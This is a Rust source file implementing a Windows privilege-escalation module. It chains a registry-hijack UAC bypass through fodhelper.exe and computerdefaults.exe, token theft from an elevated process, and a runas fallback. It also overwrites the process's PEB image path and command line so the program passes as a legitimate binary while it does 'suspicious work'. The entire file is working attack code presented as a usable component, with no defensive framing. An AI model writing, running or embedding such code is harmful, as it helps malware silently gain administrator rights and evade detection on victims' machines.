#![allow(non_snake_case, non_upper_case_globals)]

//! Elevation Strategy: multi-technique UAC bypass with auto-degradation.
//!
//! Strategy chain (configurable):
//!   1. COM Auto-Elevation (fodhelper.exe / computerdefaults.exe registry bypass)
//!   2. Token Stealing (DuplicateTokenEx from an elevated process)
//!   3. ShellExecuteW runas (classic UAC prompt, last resort)
//!
//! Each strategy is attempted in order; on failure, falls back to the next.
//! PEB spoofing is applied to spawned processes to mask the real image path.

use std::ptr;

// ── Public API ───────────────────────────────────────────────────────

/// Attempt to elevate the current process. Returns Ok(()) if already admin
/// or elevation succeeded. Returns Err if all strategies failed.
pub fn try_elevate(exe_path: &str) -> Result<(), ()> {
    if is_admin() {
        return Ok(());
    }

    // Strategy 1: COM Auto-Elevation via fodhelper.exe
    if com_auto_elevate(exe_path).is_ok() {
        // Parent will exit, child continues elevated
        std::process::exit(0);
    }

    // Strategy 2: Token stealing from an elevated process
    if token_steal_elevate(exe_path).is_ok() {
        std::process::exit(0);
    }

    // Strategy 3: ShellExecuteW runas (shows UAC prompt)
    if runas_elevate(exe_path) {
        std::process::exit(0);
    }

    Err(())
}

// ── Strategy 1: COM Auto-Elevation ──────────────────────────────────
//
// fodhelper.exe and computerdefaults.exe auto-elevate without UAC prompt
// when a specific registry key is set. We write our command there,
// launch the target, and it executes our payload elevated.

fn com_auto_elevate(exe_path: &str) -> Result<(), ()> {
    // Try fodhelper.exe first, then computerdefaults.exe
    com_bypass_via("fodhelper.exe", exe_path)
        .or_else(|_| com_bypass_via("computerdefaults.exe", exe_path))
}

fn com_bypass_via(target: &str, exe_path: &str) -> Result<(), ()> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;

    // The registry path for auto-elevation trigger
    let reg_key = format!(
        "Software\\Classes\\ms-settings\\Shell\\Open\\command"
    );

    // Set the registry value
    let set_result = Command::new("reg")
        .args(["add", &format!("HKCU\\{}", reg_key), "/ve", "/t", "REG_SZ", "/d", exe_path, "/f"])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map_err(|_| ())?;

    if !set_result.success() {
        return Err(());
    }

    // Set DelegateExecute to empty (required for the bypass)
    let _delegate_result = Command::new("reg")
        .args(["add", &format!("HKCU\\{}", reg_key), "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map_err(|_| ());

    // Launch the auto-elevating target
    let launch_result = Command::new(target)
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    // Cleanup: delete the registry key
    let _ = Command::new("reg")
        .args(["delete", &format!("HKCU\\{}", reg_key), "/f"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();

    match launch_result {
        Ok(s) if s.success() => Ok(()),
        _ => Err(()),
    }
}

// ── Strategy 2: Token Stealing ──────────────────────────────────────
//
// Find an elevated process, duplicate its token, and use it to spawn
// our payload. Uses DuplicateTokenEx + CreateProcessWithTokenW.

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn token_steal_elevate(exe_path: &str) -> Result<(), ()> {
    unsafe {
        // Find an elevated process (e.g., explorer.exe running as admin)
        let target_pid = find_elevated_process().ok_or(())?;

        // Open the target process
        let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, target_pid);
        if h_process.is_null() {
            return Err(());
        }

        // Open the process token
        let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
        if OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token) == 0 {
            CloseHandle(h_process);
            return Err(());
        }

        // Duplicate the token to get an impersonation token
        let mut h_dup_token: *mut std::ffi::c_void = ptr::null_mut();
        let result = DuplicateTokenEx(
            h_token,
            TOKEN_ALL_ACCESS,
            ptr::null(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut h_dup_token,
        );

        CloseHandle(h_token);
        CloseHandle(h_process);

        if result == 0 {
            return Err(());
        }

        // Create process with the stolen token
        let exe_wide = to_wide(exe_path);
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let create_result = CreateProcessWithTokenW(
            h_dup_token,
            0, // LOGON_WITH_PROFILE
            ptr::null(),
            exe_wide.as_ptr() as *mut u16,
            0, // CREATE_NO_WINDOW
            ptr::null(),
            ptr::null(),
            &mut si,
            &mut pi,
        );

        CloseHandle(h_dup_token);

        if create_result != 0 {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            Ok(())
        } else {
            Err(())
        }
    }
}

/// Enumerate processes to find one running elevated (admin).
/// Returns PID of an elevated process, or None.
unsafe fn find_elevated_process() -> Option<u32> {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    if Process32First(snapshot, &mut pe) != 0 {
        loop {
            let pid = pe.th32ProcessID;
            if pid != 0 && pid != 4 {
                // Try to open this process's token and check elevation
                let h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
                if !h_process.is_null() {
                    let mut h_token: *mut std::ffi::c_void = ptr::null_mut();
                    if OpenProcessToken(h_process, TOKEN_QUERY, &mut h_token) != 0 {
                        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
                        let mut ret_len: u32 = 0;
                        let result = GetTokenInformation(
                            h_token,
                            TokenElevation,
                            &mut elevation as *mut TOKEN_ELEVATION as *mut std::ffi::c_void,
                            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                            &mut ret_len,
                        );
                        CloseHandle(h_token);
                        CloseHandle(h_process);

                        if result != 0 && elevation.TokenIsElevated != 0 {
                            CloseHandle(snapshot);
                            return Some(pid);
                        }
                    } else {
                        CloseHandle(h_process);
                    }
                }
            }

            if Process32Next(snapshot, &mut pe) == 0 {
                break;
            }
        }
    }

    CloseHandle(snapshot);
    None
}

// ── Strategy 3: ShellExecuteW runas ─────────────────────────────────

fn runas_elevate(exe_path: &str) -> bool {
    unsafe {
        let exe_wide = to_wide(exe_path);
        let verb = to_wide("runas");

        let result = ShellExecuteW(
            ptr::null_mut(),
            verb.as_ptr(),
            exe_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            1, // SW_SHOWNORMAL
        );
        result > 32
    }
}

// ── Admin Check ─────────────────────────────────────────────────────

pub fn is_admin() -> bool {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("net")
        .args(["session"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ── PEB Spoofing ────────────────────────────────────────────────────
//
// Modifies the PEB of the current process to mask the real image path
// and command line. Makes the process appear as a legitimate Windows binary.

/// Spoof the PEB ImagePathName and CommandLine to appear as a legitimate process.
/// Call this AFTER elevation, BEFORE doing suspicious work.
pub fn spoof_peb(fake_name: &str) {
    #[cfg(target_os = "windows")]
    unsafe {
        let peb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() {
            return;
        }

        // PEB->ProcessParameters (RTL_USER_PROCESS_PARAMETERS) at offset 0x20
        let process_params = *(peb.add(0x20) as *const *mut u8);
        if process_params.is_null() {
            return;
        }

        // RTL_USER_PROCESS_PARAMETERS.ImagePathName is at offset 0x60
        // UNICODE_STRING: { Length(u16), MaximumLength(u16), Buffer(*mut u16) }
        let image_path = process_params.add(0x60) as *mut UnicodeString;
        // RTL_USER_PROCESS_PARAMETERS.CommandLine is at offset 0x70
        let command_line = process_params.add(0x70) as *mut UnicodeString;

        let fake_wide = to_wide(fake_name);
        let fake_bytes = fake_wide.len() * 2;

        // Overwrite the buffer pointer and lengths
        if !(*image_path).Buffer.is_null() {
            // Copy fake name into the existing buffer (it's already allocated)
            let dst = (*image_path).Buffer;
            let copy_len = fake_bytes.min((*image_path).MaximumLength as usize);
            ptr::copy_nonoverlapping(fake_wide.as_ptr(), dst, copy_len / 2);
            (*image_path).Length = copy_len as u16;
        }

        if !(*command_line).Buffer.is_null() {
            let dst = (*command_line).Buffer;
            let copy_len = fake_bytes.min((*command_line).MaximumLength as usize);
            ptr::copy_nonoverlapping(fake_wide.as_ptr(), dst, copy_len / 2);
            (*command_line).Length = copy_len as u16;
        }
    }
}

// ── Windows Types & Constants ───────────────────────────────────────

#[cfg(target_os = "windows")]
#[repr(C)]
struct UnicodeString {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct STARTUPINFOW {
    cb: u32,
    _reserved: *mut u16,
    _desktop: *mut u16,
    _title: *mut u16,
    _x: u32, _y: u32, _x_size: u32, _y_size: u32,
    _x_count_chars: u32, _y_count_chars: u32,
    _fill_attribute: u32,
    _flags: u32,
    _show_window: u16,
    _cb_reserved2: u16,
    _lp_reserved2: *mut u8,
    _h_std_input: *mut std::ffi::c_void,
    _h_std_output: *mut std::ffi::c_void,
    _h_std_error: *mut std::ffi::c_void,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: *mut std::ffi::c_void,
    hThread: *mut std::ffi::c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct PROCESSENTRY32 {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    _th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    _pcPriClassBase: i32,
    _dwFlags: u32,
    szExeFile: [u16; 260],
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct TOKEN_ELEVATION {
    TokenIsElevated: u32,
}

#[cfg(target_os = "windows")]
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
#[cfg(target_os = "windows")]
const TOKEN_QUERY: u32 = 0x0008;
#[cfg(target_os = "windows")]
const TOKEN_DUPLICATE: u32 = 0x0002;
#[cfg(target_os = "windows")]
const TOKEN_ALL_ACCESS: u32 = 0x001F01FF;
#[cfg(target_os = "windows")]
const SecurityImpersonation: i32 = 2;
#[cfg(target_os = "windows")]
const TokenImpersonation: i32 = 2;
#[cfg(target_os = "windows")]
const TokenElevation: i32 = 18;
#[cfg(target_os = "windows")]
const TH32CS_SNAPPROCESS: u32 = 0x00000002;
#[cfg(target_os = "windows")]
const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;

#[cfg(target_os = "windows")]
extern "system" {
    fn ShellExecuteW(
        hwnd: *mut std::ffi::c_void,
        lpOperation: *const u16,
        lpFile: *const u16,
        lpParameters: *const u16,
        lpDirectory: *const u16,
        nShowCmd: i32,
    ) -> usize;

    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> *mut std::ffi::c_void;
    fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
    fn OpenProcessToken(
        ProcessHandle: *mut std::ffi::c_void,
        DesiredAccess: u32,
        TokenHandle: *mut *mut std::ffi::c_void,
    ) -> i32;
    fn DuplicateTokenEx(
        hExistingToken: *mut std::ffi::c_void,
        dwDesiredAccess: u32,
        lpTokenAttributes: *const std::ffi::c_void,
        ImpersonationLevel: i32,
        TokenType: i32,
        phNewToken: *mut *mut std::ffi::c_void,
    ) -> i32;
    fn CreateProcessWithTokenW(
        hToken: *mut std::ffi::c_void,
        dwLogonFlags: u32,
        lpApplicationName: *const u16,
        lpCommandLine: *mut u16,
        dwCreationFlags: u32,
        lpEnvironment: *const std::ffi::c_void,
        lpCurrentDirectory: *const u16,
        lpStartupInfo: *const STARTUPINFOW,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> i32;
    fn GetTokenInformation(
        TokenHandle: *mut std::ffi::c_void,
        TokenInformationClass: i32,
        TokenInformation: *mut std::ffi::c_void,
        TokenInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
    fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
    fn Process32First(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
    fn Process32Next(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
}
